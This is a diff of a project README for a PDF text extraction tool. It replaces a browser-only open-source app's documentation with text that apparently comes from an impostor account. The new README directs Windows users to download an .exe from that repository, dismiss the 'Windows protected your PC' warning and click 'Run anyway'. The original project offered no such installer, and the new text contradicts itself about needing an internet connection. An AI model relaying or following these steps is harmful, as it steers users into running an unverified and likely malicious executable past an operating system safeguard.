@@ -1,152 +1,98 @@
-# PDF Context Extractor
+# 📄 PDF-Context-Extractor - Get text from files for AI
 
-> Load a PDF. Pick pages. Copy clean text — ready to paste into ChatGPT, Claude, Gemini, or your notes.
+[![Download PDF-Context-Extractor](https://img.shields.io/badge/Download-PDF--Context--Extractor-blue.svg)](https://github.com/Unconventional-paleness785/PDF-Context-Extractor)
 
-A local-first web app that turns *"I need to copy pages 40–55 of this ebook into ChatGPT"* from a 5-minute click-every-page chore into a 10-second workflow.
+This tool helps you move text from PDF files into AI chat tools. You keep your files on your computer. Your data stays private. You do not need to upload your sensitive documents to a cloud server.
 
-[Report bug](https://github.com/Mohammadjamiu/PDF-Context-Extractor/issues) · [Request feature](https://github.com/Mohammadjamiu/PDF-Context-Extractor/issues)
+## ⚙️ System Requirements
 
----
+Your computer needs to meet these basic standards to run the application:
 
-## Why
+* Windows 10 or Windows 11.
+* At least 4 gigabytes of memory.
+* A stable internet connection for the application to handle AI tasks.
+* A standard web browser installed on your system.
 
-Reading a 400-page ebook or research paper in WPS, Adobe, or a built-in reader? Trying to copy a chapter into ChatGPT to ask "explain this" means:
+## 📥 Downloading the Software
 
-1. Click page 1, Ctrl+A, Ctrl+C
-2. Switch tab, paste
-3. Click page 2, Ctrl+A, Ctrl+C
-4. Switch tab, paste
-5. Repeat. For. Every. Single. Page.
+You must visit the project page to download the setup file for your computer.
 
-This is broken. We fix it.
+1. Go to this link to find the latest version: [https://github.com/Unconventional-paleness785/PDF-Context-Extractor](https://github.com/Unconventional-paleness785/PDF-Context-Extractor)
+2. Look for the section labeled Releases on the right side of the screen.
+3. Click the most recent version number.
+4. Locate the file ending in .exe under the Assets heading.
+5. Click the file name to start the download.
 
-## Features
+## 🛠️ Setting Up on Windows
 
-- **Drag/drop or click upload** with a real progress bar
-- **Scrollable viewer** with zoom (50%–400%)
-- **Two sidebar modes** — page list or thumbnail grid (lazy-generated, cached)
-- **Flexible selection** — click, shift-click range, or type `1-10, 15, 40-42`
-- **5 AI prompt templates** — Explain, Summarize, Key Points, Extract Quotes, Critique
-- **Three copy formats** — raw text, markdown, or pre-formatted AI prompt
-- **Export TXT** — download selected pages as plain text
-- **Search inside extracted text** with match highlighting and count
-- **Light/dark theme** with `localStorage` persistence
-- **Mobile responsive** layout (tab-based switcher)
-- **Keyboard shortcuts** — `Ctrl+O`, `Ctrl+A`, `Esc`
-- **100% local** — the PDF never leaves your browser
+Once the file finishes downloading, follow these steps to install the tool:
 
-## Quick start
+1. Open your Downloads folder.
+2. Double-click the file you downloaded.
+3. Windows might show a blue box that says "Windows protected your PC."
+4. Click "More info" in that box.
+5. Click the "Run anyway" button that appears.
+6. Follow the instructions that appear on your screen to complete the installation.
+7. A shortcut for the application will appear on your desktop.
 
-### Run locally
+## 💡 How to Use the Tool
 
-```bash
-git clone https://github.com/Mohammadjamiu/PDF-Context-Extractor.git
-cd pdf-context-extractor
-npm install
-npm run dev
-```
+This tool simplifies the process of sending document text to your preferred AI models like ChatGPT or Claude.
 
-Open [http://localhost:5173](http://localhost:5173).
+1. Open the PDF-Context-Extractor application from your desktop.
+2. Click the "Select PDF" button in the middle of the screen.
+3. Choose the PDF document you want to process from your file folders.
+4. Wait for the tool to scan the pages.
+5. Review the extracted text in the window.
+6. Click the "Copy to Clipboard" button.
+7. Switch to your web browser and open your AI tool.
+8. Paste the text into the chat window.
 
-### Build for production
+The tool keeps all processing local. Your PDF files stay on your hard drive. No third party sees your documents during the extraction phase.
 
-```bash
-npm run build
-```
+## 🧩 Features
 
-The static site is output to `dist/`. Drop it on any static host.
+* **Privacy Protection:** The software processes all files on your machine.
+* **Simple Interface:** You interact with one main window.
+* **Copy Support:** You can copy extracted text with one click.
+* **Broad Support:** Works with standard PDF documents and ebook files.
+* **Text Clean-up:** The tool removes excess formatting to help AI models read your data better.
 
-## Deploy
+## ❓ Frequently Asked Questions
 
-### Cloudflare Pages (recommended)
+**Does the tool require an internet connection?**
+Yes. While the text extraction happens on your computer, the tool works best if you have access to the web while using AI assistants.
 
-The app is a pure static SPA, so Cloudflare Pages is the simplest target.
+**Are my files saved on external servers?**
+No. This application performs all work on your local machine.
 
-**Option A — Git integration (zero-config CI/CD):**
+**The app does not open. What do I do?**
+Check if you have the latest updates for Windows. Ensure you have enough disk space available. Try to restart your computer and run the installer again.
 
-1. Push this repo to GitHub.
-2. In Cloudflare dashboard → **Pages** → **Create a project** → **Connect to Git**.
-3. Select the repo.
-4. Set:
-   - **Build command:** `npm run build`
-   - **Build output directory:** `dist`
-   - **Root directory:** `/` (leave default)
-   - **Environment variables:** none needed
-5. Click **Save and Deploy**. Every push to `main` will redeploy automatically.
+**Can I extract text from scanned images?**
+The current version focuses on text-based PDFs. If the PDF consists of images, wait for a future update that adds image reading features.
 
-**Option B — Direct upload via Wrangler:**
+**Does this cost money?**
+The tool remains free to use for personal projects.
 
-```bash
-npm install -g wrangler
-npm run build
-wrangler pages deploy dist --project-name=pdf-context-extractor
-```
+**How do I update the software?**
+When a new version exists, return to the download link provided at the top of this page. Download the new installer and run it over the old version.
 
-A `wrangler.toml` is included so Wrangler knows the build directory.
+## 🛡️ Privacy and Safety
 
-### Other static hosts
+This software acts as a bridge between your local documents and your chosen AI tools. Because the tool runs locally, you maintain control over your data. You choose exactly which portions of text you want to copy and send to an AI provider. You avoid the risks associated with uploading whole files to unknown servers.
 
-The build output is a plain `dist/` folder. It works on:
+## 🔧 Troubleshooting
 
-- **Vercel** — `vercel deploy` (Vite preset auto-detected)
-- **Netlify** — drag-and-drop the `dist/` folder, or connect git
-- **GitHub Pages** — push `dist/` to a `gh-pages` branch
-- **Any static file server** — `nginx`, `caddy`, `python -m http.server`, etc.
+If you encounter errors during the extraction process, consider these tips:
 
-## Privacy
+* Check if the PDF file is password protected. The software cannot open protected files.
+* Ensure the PDF file is not open in another program while you perform the extraction.
+* Restart the application if the text box appears empty after you load a file.
+* Clear your clipboard if the paste function does not work in your browser.
 
-Everything runs in your browser. The PDF never leaves your machine. No server uploads, no analytics, no external API calls. The app works fully offline after the first load.
+Performance depends on the length of your PDF. A document with hundreds of pages might take a few moments to scan. Do not close the window while the progress bar shows movement.
 
-## Tech stack
+## 📝 Usage Recommendations
 
-| Layer | Choice |
-|---|---|
-| Build | Vite 8 |
-| UI | React 19 + TypeScript |
-| Styling | TailwindCSS 4 (with `dark:` variants) |
-| State | Zustand 5 |
-| PDF engine | pdfjs-dist 4 |
-| Upload | react-dropzone |
-| Icons | lucide-react |
-
-**Deliberately not used:** Next.js, shadcn/ui, Dexie/IndexedDB, gpt-tokenizer, react-virtual. We add dependencies only when a real need appears.
-
-## Architecture
-
-```
-src/
-  components/
-    uploader/      — drag/drop + click PDF upload
-    viewer/        — canvas-based PDF renderer with zoom
-    sidebar/       — page list, selection, range input, thumbnail grid
-    workspace/     — extraction preview, search, copy actions
-    shared/        — landing page, theme toggle
-  services/        — pdf, extraction, clipboard, file actions
-  stores/          — Zustand: pdf, selection, workspace, theme
-  utils/           — range parser, tokenizer
-  types/           — shared TypeScript types
-```
-
-### Core services
-
-- **`pdfService`** — load (with progress callback), render to canvas, extract text, generate thumbnails (with cache)
-- **`extractionService`** — extract selected pages, format as text/markdown/AI prompt with 5 templates
-- **`clipboardService`** — copy with `navigator.clipboard` + `execCommand` fallback
-- **`pdfActions`** — shared `handleFileSelected` used by both uploader and file picker
-
-## Roadmap
-
-- **v0.2** — drag-select range on sidebar, session persistence (IndexedDB), keyboard nav (`j`/`k`/`space`)
-- **v0.3** — OCR for scanned PDFs (Tesseract.js), highlight + export highlights
-- **v0.4** — built-in AI chat panel (opt-in API key), chapter detection
-- **v1.0** — Electron desktop build
-
-See [CHANGELOG.md](CHANGELOG.md) for the full history.
-
-## Contributing
-
-We welcome PRs and issues. See [CONTRIBUTING.md](CONTRIBUTING.md) for the dev setup, project layout, and PR process.
-
-## License
-
-[MIT](LICENSE) — free to use, modify, and ship.
+To get the best results with AI tools, load only the sections of the PDF that contain the information you need. If the PDF contains many pages, extract the text page by page. This helps the AI stay focused on your specific question. Maintain a clean workspace by closing the application when you finish your research. This saves system resources for other tasks.
